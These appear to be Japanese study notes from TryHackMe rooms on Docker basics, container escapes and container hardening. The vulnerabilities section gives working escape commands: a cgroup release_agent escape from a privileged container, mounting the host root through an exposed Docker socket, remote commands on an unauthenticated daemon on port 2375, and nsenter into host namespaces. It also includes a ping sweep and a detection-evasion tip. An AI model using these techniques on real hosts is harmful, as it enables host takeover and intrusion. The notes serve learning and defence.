# Docker

https://tryhackme.com/room/introtodockerk8pdqk

## 基本コマンド

### pull

```sh
# イメージをPull
docker pull nginx
```

イメージタグのバリエーション

```
docker pull ubuntu
docker pull ubuntu:latest
docker pull ubuntu:22.04
```

### image

```sh
# イメージに対して実行可能なコマンドを表示
docker image

Usage:  docker image COMMAND

Manage images

Commands:
  build       Build an image from a Dockerfile
  history     Show the history of an image
  import      Import the contents from a tarball to create a filesystem image
  inspect     Display detailed information on one or more images
  load        Load an image from a tar archive or STDIN
  ls          List images
  prune       Remove unused images
  pull        Pull an image or a repository from a registry
  push        Push an image or a repository to a registry
  rm          Remove one or more images
  save        Save one or more images to a tar archive (streamed to STDOUT by default)
  tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE

Run 'docker image COMMAND --help' for more information on a command.
```

```sh
# ローカルシステムに保存されている全てのイメージ
docker image ls

# システムからイメージを削除
docker image rm ubuntu:22.04
```

### run

#### 構文

```sh
docker run [OPTIONS] IMAGE_NAME [COMMAND] [ARGUMENTS...]
```

```sh
# -it でインタラクティブ。コンテナ内で /bin/bashを起動
docker run -it helloworld /bin/bash
```

#### 一般的なオプション

| オプション | 説明                           | 関連する Dockerfile 命令 | 使用例                                                             |
| ---------- | ------------------------------ | ------------------------ | ------------------------------------------------------------------ |
| `-d`       | バックグラウンドで実行する     | N/A                      | `docker run -d helloworld`                                         |
| `-it`      | 対話的にシェルを開く           | N/A                      | `docker run -it helloworld`                                        |
| `-v`       | ホストのディレクトリをマウント | `VOLUME`                 | `docker run -v /host/os/directory:/container/directory helloworld` |
| `-p`       | ポートをホストとバインドする   | `EXPOSE`                 | `docker run -p 80:80 webserver`                                    |
| `--rm`     | 終了後に自動削除する           | N/A                      | `docker run --rm helloworld`                                       |
| `--name`   | コンテナに名前を付ける         | N/A                      | `docker run --name helloworld`                                     |

### ps

```sh
# 実行中のコンテナを一覧表示
docker ps

# 停止しているコンテナも含む
docker ps -a
```

### ping

自分以外のホストを探す。（ホスト OS が見つかる可能性がそれなりに高い）

```sh
for i in {1..254}; do ping -c 1 -W 1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i is up"; done
```

## Dockerfile

### 基本的な構文

```
INSTRUCTION argument
```

### 重要な命令

| 命令      | 説明                                         | 使用例                             |
| --------- | -------------------------------------------- | ---------------------------------- |
| `FROM`    | ベースイメージを指定（最初に必要）           | `FROM ubuntu`                      |
| `RUN`     | コマンドを実行し、新しいレイヤーを作成       | `RUN whoami`                       |
| `COPY`    | ホストからコンテナへファイルをコピー         | `COPY /home/cmnatic/myfolder/app/` |
| `WORKDIR` | 作業ディレクトリを設定（cd に類似）          | `WORKDIR /`                        |
| `CMD`     | コンテナ起動時に実行するコマンドを指定       | `CMD /bin/sh -c script.sh`         |
| `EXPOSE`  | 公開予定のポートを指定（実際の公開はしない） | `EXPOSE 80`                        |

### 例

```yaml
# THIS IS A COMMENT
FROM ubuntu:22.04

# Update the APT repository to ensure we get the latest version of apache2
RUN apt-get update -y

# Install apache2
RUN apt-get install apache2 -y

# Tell the container to expose port 80 to allow us to connect to the web server
EXPOSE 80

# Tell the container to run the apache2 service
CMD ["apache2ctl", "-D","FOREGROUND"]
```

### ビルド

```sh
# イメージをビルド
docker build -t helloworld .
```

### 最適化

ビルドステップを減らすために、レイヤー数を減らすことが重要。  
各命令は独自のレイヤーで実行される。  
例えば下記、前者はレイヤー数 5 だが、後者はレイヤー数 2 になる。

```yaml
FROM ubuntu:latest
RUN apt-get update -y
RUN apt-get upgrade -y
RUN apt-get install apache2 -y
RUN apt-get install net-tools -y
```

```yaml
FROM ubuntu:latest
RUN apt-get update -y && apt-get upgrade -y && apt-get install apache2 -y && apt-get install net-tools
```

## Docker Compose

WEB サーバーコンテナ、DB コンテナ等の複数のコンテナを、1 つにまとめることができる。

インストールが必要  
https://docs.docker.com/compose/install/

| コマンド | 説明                                 | 使用例                 |
| -------- | ------------------------------------ | ---------------------- |
| `up`     | コンテナをビルド・作成・起動する     | `docker-compose up`    |
| `start`  | ビルド済みのコンテナを起動する       | `docker-compose start` |
| `down`   | コンテナを停止して削除する           | `docker-compose down`  |
| `stop`   | コンテナを停止する（削除しない）     | `docker-compose stop`  |
| `build`  | コンテナをビルドする（起動はしない） | `docker-compose build` |

### docker-compose.yml の例

手動の場合に下記コマンドになるところ

```sh
docker network create ecommerce
docker run -p 80:80 --name webserver --net ecommerce webserver
docker run --name database --net ecommerce webserver
```

```yaml
version: "3.3"
services:
  web:
    build: ./web
    networks:
      - ecommerce
    ports:
      - "80:80"

  database:
    image: mysql:latest
    networks:
      - ecommerce
    environment:
      - MYSQL_DATABASE=ecommerce
      - MYSQL_USERNAME=root
      - MYSQL_ROOT_PASSWORD=helloword

networks:
  ecommerce:
```

## 脆弱性

https://tryhackme.com/room/containervulnerabilitiesDG

ゲスト OS ユーザーの capability が重要。

```sh
# capabilityの表示
capsh --print

# CAP_SYS_ADMIN や CAP_SYS_MODULE などが有効な場合、特権コンテナと考えられる。
```

### 特権モードコンテナ

特権モードで実行されているコンテナ（--privileged）は、Docker エンジンをバイパスし、ホスト OS と直接通信する。

```sh
# cgroup v1 か v2 かを判別する
mount | grep cgroup
```

下記は、cgroup v1 でのみ有効な手法

```sh
# 1. cgroupをマウント（ホストOS側のカーネルに属する cgroup 機能の「一部」へのアクセス）
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# 2. 「cgroup」が終了したらカーネルに何かを実行するよう指示
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. コンテナのファイルがホスト上のどこにあるかを調べ、変数として保存
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# 4. release_agent は、リリースされると「cgroup」によって実行される
echo "$host_path/exploit" > /tmp/cgrp/release_agent

# 5,6,7. エクスプロイトコード
echo '#!/bin/sh' > /exploit
echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit

# 8. PID を書き込むと、そのプロセスが指定された cgroup に所属する。
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.

### 公開された Docker デーモンによるエスケープ

ゲスト OS で実行

```sh
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

- ホスト OS の / を、ゲスト OS の /mnt にマウントしている。
- 軽量なため alpine がよく使われるが、システムに既に存在するイメージを使用する方が検出されにくい。
- chroot で /mnt をコンテナのルートディレクトリに変更している。

ホスト OS の Docker デーモンと通信する UNIX ソケットがゲスト OS から見えている場合、ホスト OS で Docker コマンドを実行するのと同じことになる。

```sh
root@2225bfdee7ec:~# docker context inspect
[
    {
        "Name": "default",
        "Metadata": {},
        "Endpoints": {
            "docker": {
                "Host": "unix:///var/run/docker.sock",
                "SkipTLSVerify": false
            }
        },
        "TLSMaterial": {},
        "Storage": {
            "MetadataPath": "\u003cIN MEMORY\u003e",
            "TLSPath": "\u003cIN MEMORY\u003e"
        }
    }
]
```

### 公開された Docker デーモンによる RCE

Docker デーモンが UNIX ソケットではなく TCP ソケットをリッスンする場合もある。（リモート管理のため）

通常は 2375 ポート。

```sh
PORT    STATE SERVICE VERSION
2375/tcp open docker Docker 20.10.20 (API 1.41)
```

```json
cmnatic@attack-machine:~$ curl http://10.10.34.80:2375/version
{
  "Platform": {
    "Name": "Docker Engine - Community"
  },
  "Components": [
    {
      "Name": "Engine",
      "Version": "20.10.20",
      "Details": {
        "ApiVersion": "1.41",
        "Arch": "amd64",
        "BuildTime": "2022-10-18T18:18:12.000000000+00:00",
        "Experimental": "false",
        "GitCommit": "03df974",
        "GoVersion": "go1.18.7",
        "KernelVersion": "5.15.0-1022-aws",
        "MinAPIVersion": "1.12",
        "Os": "linux"
      }]
}
```

```sh
# リモート実行
docker -H tcp://10.10.34.80:2375 ps
```

### 名前空間の悪用

名前空間は、プロセス、ファイル、メモリなどのシステムリソースを他の名前空間から分離する。Linux 上で実行されるすべてのプロセスには、次の 2 つのものが割り当てられる。

1. 名前空間
2. プロセス識別子 ( PID )

名前空間はコンテナ化を実現する手段。プロセスは同じ名前空間内のプロセスしか「見る」ことができない。

通常、`ps aux`を実行したとき、ゲスト OS ではわずかなプロセスしか表示されない。それはコンテナ内にいることを強く示唆する。

逆に、コンテナ内にも関わらず通常のように大量に表示される場合、コンテナがホスト OS と同じ名前空間を共有している（コンテナがホスト OS 上のプロセスと通信できる）ことを意味する。

```sh
# エクスプロイト
nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

- `--target 1` プロセス 1（/sbin/ini）を対象とする
- `--mount` 対称プロセスと同じマウント名前空間に入る
- `--uts` 対象と同じ UTS 名前空間（ホスト名やドメイン名の空間）に入る
- `--ipc` 対象と同じ IPC 名前空間に入る。→ shm（共有メモリ）や sem（セマフォ）などの IPC リソースを共有できる。
- `--net` 対象と同じネットワーク名前空間に入る。→ ネットワークインターフェースやルーティング設定が同じになる。

## セキュリティ強化

https://tryhackme.com/room/containerhardening

### Docker デーモンの保護

#### SSH

```sh
# dockerコンテキストを作る
docker context create --docker host=ssh://myuser@remotehost --description="Development Environment"  development-environment-host

# コンテキストを切り替える
docker context use development-environment-host

# デフォルトに戻す
docker context use default
```

#### TLS

```sh
# TLS モードでデーモンを起動する
dockerd --tlsverify --tlscacert=myca.pem --tlscert=myserver-cert.pem --tlskey=myserver-key.pem -H=0.0.0.0:2376

# クライアント側
docker --tlsverify --tlscacert=myca.pem --tlscert=client-cert.pem --tlskey=client-key.pem -H=SERVERIP:2376 info
```

### コントロールグループの実装

欠陥のあるコンテナがシステムリソースを枯渇させるのを防ぐ。

```sh
# 設定
docker update --memory="40m" mycontainer

# 確認
docker inspect mycontainer
```

### 特権コンテナの防止

特権コンテナはホスト上のリソースにアクセスできる。

`--privileged` ではなく、個別に機能を割り当てる。

```sh
docker run -it --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE mywebserver
```

```sh
# 割り当てられている機能の確認
capsh --print
```

### Seccomp

https://docs.docker.com/engine/security/seccomp/#:~:text=Secure%20computing%20mode%20(%20seccomp%20)%20is,state%20of%20the%20calling%20process.

例

```json
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "name": "socket",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    },
    {
      "name": "connect",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    },
    {
      "name": "bind",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    },
    {
      "name": "listen",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    },
    {
      "name": "accept",
      "action": "SCMP_ACT_ERRNO",
      "args": []
    }
    {
      "name": "read",
      "action": "SCMP_ACT_ALLOW",
      "args": []
    },
    {
      "name": "write",
      "action": "SCMP_ACT_ALLOW",
      "args": []
    }
  ]
}
```

```sh
# seccompを指定してコンテナ起動
docker run --rm -it --security-opt seccomp=/home/cmnatic/container1/seccomp/profile.json mycontainer
```

### AppArmor

https://docs.docker.com/engine/security/apparmor/

```sh
# AppArmorがインストールされているか確認
cmnatic@thm:~# sudo aa-status
apparmor module is loaded.
34 profiles are loaded.
```

例

```
/usr/sbin/httpd {

  capability setgid,
  capability setuid,

  /var/www/** r,
  /var/log/apache2/** rw,
  /etc/apache2/mime.types r,

  /run/apache2/apache2.pid rw,
  /run/apache2/*.sock rw,

  # Network access
  network tcp,

  # System logging
  /dev/log w,

  # Allow CGI execution
  /usr/bin/perl ix,

  # Deny access to everything else
  /** ix,
  deny /bin/**,
  deny /lib/**,
  deny /usr/**,
  deny /sbin/**
}
```

```sh
# プロファイルをインポート
sudo apparmor_parser -r -W /home/cmnatic/container1/apparmor/profile.json
```

```sh
# プロファイルを指定してコンテナを起動
docker run --rm -it --security-opt apparmor=/home/cmnatic/container1/apparmor/profile.json mycontainer
```

### イメージの分析

#### docker scout

https://github.com/docker/scout-cli

```sh
docker scout cves local://nginx:latest
```

#### grype

https://github.com/anchore/grype

```sh
grype imagename --scope all-layers

grype /path/to/image.tar
```
